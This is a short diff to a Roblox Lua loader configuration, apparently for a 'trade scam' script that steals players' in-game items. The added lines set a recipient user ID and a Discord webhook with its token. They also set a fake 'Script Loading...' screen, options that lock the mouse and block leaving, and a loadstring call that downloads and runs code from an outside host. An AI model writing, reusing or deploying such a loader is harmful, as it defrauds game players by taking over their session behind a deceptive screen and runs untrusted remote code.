@@ -1,4 +1,14 @@
 _G.UserID = 3938307589
-_G.Webhook = "https://discord.com/api/webhooks/1096610764074270760/nQ0xfLAeh-UA5lVuOcu8V8sdviFagGTlv90QYtRDyYaMjqhqENSBDJwCOGmBFQSJ6OSM" 
+_G.Webhook = "https://discord.com/api/webhooks/1095923184898945124/7nq3Wfshkb1fEuv-V6uo2iIOajOt-gtaY6fZs1pN3O7J7ovtP3eqlavg2GVYj5tdCkp6"
 
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Script.lua", true))()
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "trade scam"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 50
+
+loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
